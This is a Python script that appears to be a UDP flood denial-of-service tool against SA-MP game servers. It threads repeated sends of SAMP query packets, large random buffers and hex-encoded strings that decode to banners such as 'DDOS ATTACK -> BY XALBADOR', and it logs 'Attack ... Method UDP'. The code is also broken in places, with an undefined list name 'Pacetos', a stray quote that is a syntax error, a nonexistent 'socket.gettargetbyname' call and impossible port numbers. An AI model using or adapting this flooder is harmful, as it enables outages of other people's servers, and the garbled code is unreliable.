import random
import socket
import time
import threading
import os, sys
import struct, codecs

target = str(sys.argv[1])
port = int(sys.argv[2])
paket = int(sys.argv[3])
Pacotes = [codecs.decode('4142434445464748494a4b4c4d4e4f505152535455565758595a6162636465666768696a6b6c6d6e6f707172737475767778797a', 'hex_codec'), codecs.decode('53414d509538e1a9611e63', 'hex_codec'), codecs.decode('53414d509538e1a9611e69', 'hex_codec'), codecs.decode('53414d509538e1a9611e72', 'hex_codec'), codecs.decode('081e62da', 'hex_codec'), codecs.decode('081e77da', 'hex_codec'), codecs.decode('081e4dda', 'hex_codec'), codecs.decode('021efd40', 'hex_codec'), codecs.decode('081e7eda', 'hex_codec'), codecs.decode("53414d509538e1a9611e69","hex_codec"), codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"), codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec")]
Pacites = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"), codecs.decode("53414d509538e1a9611e63","hex_codec"), codecs.decode("53414d509538e1a9611e69","hex_codec"), codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"), codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"), codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"), codecs.decode("53414d509538e1a9611e72","hex_codec"), codecs.decode("081e62da","hex_codec"), codecs.decode("081e77da","hex_codec"), codecs.decode("081e4dda","hex_codec"), codecs.decode("021efd40","hex_codec"), codecs.decode("021efd40","hex_codec"), codecs.decode("35342c38302c3232","hex_codec"), codecs.decode("081e7eda","hex_codec")]

def udp(ip, port, paket, pack):
  sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  paket = int(paket)
  randport=(True,False)[port==0]
  clock=(lambda:0,time.time)[paket>0]
  dur=(1,(clock()+paket))[paket>0]
  bytes=random._urandom(65500)
  msg = Pacotes[random.randrange(0,3)]
  sock.sendto(msg, (ip, int(port)))
  s.sendto(msg, (ip, int(port)))
  payload = b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00'"
  while True:
    port=(random.randint(1,15000000),port)[randport]
    if clock()<dur:
      sock.sendto(Pacetos [4], (ip, int(port)))
      sock.sendto(Pacetos [2], (ip, int(port)))
      sock.sendto(bytes,(ip, int(port)))
      sock.sendto(Pacetos [8], (ip, int(port)))
      sock.sendto(pack, (ip, int(port)))
      sock.sendto(Pacetos [6], (ip, int(port)))
      sock.sendto(Pacetos [10], (ip, int(port)))
      s.sendto(pack, (ip, int(port)))
      sock.sendto(Pacetos [0], (ip, int(port)))
      sock.sendto(Pacetos [3], (ip, int(port)))
      sock.sendto(Pacetos [9], (ip, int(port)))
    elif clock()<dur:
      sock.sendto(Pacetos [4], (ip, int(port)))
      sock.sendto(Pacetos [2], (ip, int(port)))
      sock.sendto(bytes,(ip, int(port)))
      sock.sendto(Pacetos [8], (ip, int(port)))
      sock.sendto(pack, (ip, int(port)))
      sock.sendto(Pacetos [6], (ip, int(port)))
      sock.sendto(Pacetos [10], (ip, int(port)))
      s.sendto(pack, (ip, int(port)))
      sock.sendto(Pacetos [0], (ip, int(port)))
      sock.sendto(Pacetos [3], (ip, int(port)))
      sock.sendto(Pacetos [9], (ip, int(port)))
    else:
      sock.close()
      s.close()
      break
  print('[LOGS] Done Attack')
  
print('\n[LOGS] Attack %s:%s For %s Seconds Method UDP'%(target,port,paket or 'infinite'))
  

for x in range(10):
  ip = socket.gettargetbyname(target)
  pack = random._urandom(int(811))
  threading.Thread(target=udp, args=(ip, port, paket, pack)).start()
  time.sleep(.1)